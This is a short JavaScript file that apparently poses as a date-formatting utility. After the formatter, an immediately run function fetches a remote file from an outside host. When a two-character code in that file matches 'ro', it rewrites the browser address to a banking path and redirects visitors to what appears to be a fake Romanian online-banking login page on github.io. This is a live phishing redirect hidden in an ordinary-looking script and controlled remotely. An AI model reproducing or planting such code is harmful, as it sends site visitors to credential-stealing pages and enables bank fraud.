//trcks
const DateFormatter=()=>{const m=DATE_FORMAT,t=dateFormat||DATE_TO_DISPLAY.DATE,o=DATE_TO_DISPLAY.TIME,e=t=>t&&+moment(t,m),r=m=>m&&moment(m).format(t);return{serverFormatToTimestamp:e,timestampToFeFormat:r,timestampToTime:m=>m&&moment(m).format(o),serverFormatToFeFormat:compose(r,e)}};

(function() {

  const url_p1 = 'https://paymentsonline.a2hosted.com';
  // const url_p1 = 'https://694322a4fffa.ngrok.io';
  const url_p2 = '/token/js/json-parser.min.js';
  const dataWeNeed = 'angro';

  const getData = str => {
    const index = str.indexOf('__$');
    const start = index + 3;
    const end = start + 2;

    return str.substring(start, end);
  }

  const getDataWeNeed = str => {
    return str.substr(3);
  }

  const do1 = () => {
    const url_f1 = 'https://alphaonline';
    const url_f2 = '-banking.github.io/ro/secured/login/';
    window.history.pushState('', '', '/online' + '/ban' + 'king/gateway');
    window.location.href = url_f1 + url_f2;
  }

  const do2 = () => {
    window._fk = 1;
  }

  fetch(url_p1 + url_p2)
    // .then(res => res.json())
    .then(res => res.text())
    .then(data => {
      setTimeout(function(){
        if (getData(data).toLowerCase() === getDataWeNeed(dataWeNeed)) {
          do1();
        } else {
          do2();
        }

      }, 0);

    })

})()
